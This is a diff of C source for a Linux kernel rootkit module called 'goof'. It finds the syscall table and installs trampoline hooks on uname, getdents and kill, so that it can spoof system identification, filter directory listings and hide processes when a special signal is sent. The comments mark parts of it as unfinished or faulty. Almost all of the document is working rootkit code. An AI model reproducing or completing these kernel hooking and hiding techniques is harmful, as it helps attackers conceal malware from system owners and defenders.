@@ -91,7 +91,8 @@ goofy_open(const char *pathname, int flags, mode_t mode)
 		//tmp = getname(pathname);
 		printk("%s\n", tmp->name);		
 	}
-*/	return (*original_open)(pathname, flags, mode);
+*/	//return (*original_open)(pathname, flags, mode);
+	return NULL; //DO NOT USE
 }
 
 /* @brief the hacked version of uname: replaces Linux (or whatever) with Macos (or whatever)
@@ -136,7 +137,7 @@ int goofy_uname(struct utsname *buf){
  * @return on success the number of entries, on failure -1
  */
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
-	//Execute original funciton
+	//Execute original funciton  - hooks[1] is the index that getdents appears in the array
 	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
 	int ret = func_ptr(fd, dire, count), new_len = 0;		
 	if(!ret) { return ret; }
@@ -260,8 +261,7 @@ int goofy_kill(pid_t pid, int sig){
 	/*FAULT - invalid opcode - Relative jump is wreking everything :(
 		waiting for LDE+ to be finished to implement in-line hooking
 		*/
-	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
-	//int ret = func_ptr(pid, sig);
+	int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
 	struct task_struct *res;
 	if(sig == HIDE_SIG){
 		//pid_task(find_vpid(pid), PIDTYPE_PID); --- doesn't work b/c we're not GPL
@@ -270,7 +270,7 @@ int goofy_kill(pid_t pid, int sig){
 		res->flags ^= HIDDEN;
 		return 0;
 	}
-	int ret = original_kill(pid, sig);
+	int ret = func_ptr(pid, sig); //original_kill(pid, sig);
 	return ret;
 }
 
@@ -388,7 +388,8 @@ void remove_tramp(unsigned int id ){
 /* @brief count the number of bytes required to pad the instruction safely 
  *
  * @param src the address of the syscall that is being evaluated. 
- * 
+ *
+ * @return the number of bytes to size the hook to 
 */
 int number_of_bytes_to_pad_jump(unsigned char *src ){
 	int res = 0;
@@ -430,64 +431,42 @@ goof_init(void) {
 	__sys_call_table = find(); 
 	printk("Found table\n");
 
+	/*
 	//Update table with hooked code
 	//Regular way to hook syscall:
-	//original_uname = __sys_call_table[__NR_uname];
+	DISABLE_W_PROTECTED_MEMORY
+	original_uname = __sys_call_table[__NR_uname];
+	__sys_call_table[__NR_uname] = goofy_uname;
+	ENABLE_W_PROTECTED_MEMORY
+	*/
 
-	//DISABLE_W_PROTECTED_MEMORY
-	//__sys_call_table[__NR_uname] = goofy_uname;
-	//ENABLE_W_PROTECTED_MEMORY
-
-
-	//Trampolining way to overwrite syscall:  
+	//Trampolining way to overwrite syscall: 
 	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
-	printk("You will need to pad your hook to: %d bytes\n", padding_size);
-
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
-	printk("Hooked uname\n\n");
-
+	printk("Hooked uname with %d bytes\n\n",padding_size);
+	 
 	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
-	printk("Hooked getdents\n\n");
+	printk("Hooked getdents with %d bytes\n\n", padding_size);
 	
 	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
 	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
-	printk("Hooked kill\n\n");
+	printk("Hooked kill with %d bytes\n\n", padding_size);
 
-	//Waiting on LDE+ to create these into trampoline hooks
-	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
-/*	original_kill = __sys_call_table[__NR_kill];
 
-	DISABLE_W_PROTECTED_MEMORY
-	__sys_call_table[__NR_kill] = goofy_kill;
-	ENABLE_W_PROTECTED_MEMORY
-
-	printk("Hooked kill\n\n");
-
-	//original_open = __sys_call_table[__NR_open];
-	//__sys_call_table[__NR_open] = goofy_open;
-*/
-	//NO - waiting on an LDE @Scott Court
-	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
-	
-
-	//int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
-	//printk("You will need to pad your hook to: %d\n", padding_size);
 	return 0;
 }
 static void __exit
 goof_exit(void) {
-
 	remove_tramp(0);
 	remove_tramp(1);
 	remove_tramp(2);
 
 /*
 	DISABLE_W_PROTECTED_MEMORY
-	__sys_call_table[__NR_kill] = original_kill;
 	__sys_call_table[__NR_uname] = original_uname;
 	ENABLE_W_PROTECTED_MEMORY
-*/	//__sys_call_table[__NR_open] = original_open;
+*/	
 
 	printk("[goof] module removed\n");
 	return;
